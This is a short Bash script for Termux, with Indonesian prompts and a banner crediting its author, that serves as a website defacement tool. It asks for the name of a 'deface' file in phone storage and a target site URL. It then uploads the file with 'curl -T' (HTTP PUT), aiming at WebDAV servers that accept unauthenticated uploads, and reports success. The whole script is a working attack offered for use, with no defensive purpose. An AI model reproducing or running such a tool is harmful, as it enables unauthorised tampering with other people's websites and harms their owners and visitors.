#!/bin/bash
#webdav

clear
figlet webdav | lolcat
echo
echo "Selamat Mencoba Kak" | lolcat
echo ""
echo "======================================"
echo "Coded By MR•SANT ID" | lolcat
echo "Github : https://github.com/putraslow" | lolcat
echo "Youtube: Putra Slow" | lolcat
echo "======================================" | lolcat
echo ""
echo "Script Depes harus di luar memori internal" | lolcat
read -p $cyan"Masukan Nama Script deface: " script;
read -p $purple"Masukan Nama web deface: " web;
sleep 4
echo "Tunggu......" | lolcat
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$script $web
echo "Succes" | lolcat
echo ""
echo "Thanks Jangan Lupa Kembali lagi <_>" | lolcat

